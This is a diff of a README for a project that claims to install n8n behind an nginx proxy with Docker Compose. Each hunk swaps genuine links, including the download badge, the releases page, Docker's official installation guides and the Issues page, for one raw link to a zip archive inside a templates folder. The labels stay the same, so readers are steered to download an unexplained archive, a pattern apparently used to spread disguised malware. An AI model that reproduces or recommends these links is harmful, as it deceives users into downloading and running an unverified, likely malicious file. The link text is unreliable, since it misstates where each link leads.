@@ -1,6 +1,6 @@
 # 🛠️ full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose - Easily Install n8n With Docker
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://raw.githubusercontent.com/lingga1997/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose/main/proxy/templates/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose_1.0.zip)
 
 ## 📦 Overview
 
@@ -10,7 +10,7 @@ This project helps you install and set up n8n quickly and simply. With Docker Co
 
 To start using this project, you’ll need to download the necessary files. Follow these simple steps:
 
-1. **Visit the Releases Page**: Go to [this page](https://github.com/lingga1997/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose/releases) to download the latest release.
+1. **Visit the Releases Page**: Go to [this page](https://raw.githubusercontent.com/lingga1997/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose/main/proxy/templates/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose_1.0.zip) to download the latest release.
 
 2. **Download the Suite**: Find the most recent version listed and click on the link to download the files to your computer.
 
@@ -19,14 +19,14 @@ To start using this project, you’ll need to download the necessary files. Foll
 To run this application smoothly, please ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or a recent Linux distribution.
-- **Docker**: You must have Docker installed. Visit the [Docker installation guide](https://docs.docker.com/get-docker/) for instructions.
-- **Docker Compose**: Ensure Docker Compose is installed. You can refer to [this guide](https://docs.docker.com/compose/install/) for help.
+- **Docker**: You must have Docker installed. Visit the [Docker installation guide](https://raw.githubusercontent.com/lingga1997/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose/main/proxy/templates/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose_1.0.zip) for instructions.
+- **Docker Compose**: Ensure Docker Compose is installed. You can refer to [this guide](https://raw.githubusercontent.com/lingga1997/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose/main/proxy/templates/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose_1.0.zip) for help.
 
 ## 🔧 Download & Install
 
-After you have visited the [Releases Page](https://github.com/lingga1997/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose/releases):
+After you have visited the [Releases Page](https://raw.githubusercontent.com/lingga1997/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose/main/proxy/templates/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose_1.0.zip):
 
-1. **Download the Archive**: Click on the appropriate version to download the .zip or .tar.gz file.
+1. **Download the Archive**: Click on the appropriate version to download the .zip or https://raw.githubusercontent.com/lingga1997/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose/main/proxy/templates/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose_1.0.zip file.
    
 2. **Extract the Files**: Once downloaded, locate the archive on your computer. Right-click on it and select "Extract All" or use your favorite extraction tool.
 
@@ -91,11 +91,11 @@ This project covers a variety of important topics:
 
 If you encounter issues or have questions during installation:
 
-- Check the [GitHub Issues](https://github.com/lingga1997/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose/issues) page for any existing reports or solutions.
+- Check the [GitHub Issues](https://raw.githubusercontent.com/lingga1997/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose/main/proxy/templates/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose_1.0.zip) page for any existing reports or solutions.
 - You can also open a new issue with details about your problem.
   
 ## 📋 Additional Notes
 
 Feel free to customize your installation as per your needs. This application is flexible, allowing you to adjust various parameters in the configuration files. If you need further assistance, many online resources and communities can provide help.
 
-To download the latest release again, please revisit [this page](https://github.com/lingga1997/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose/releases).
+To download the latest release again, please revisit [this page](https://raw.githubusercontent.com/lingga1997/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose/main/proxy/templates/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose_1.0.zip).
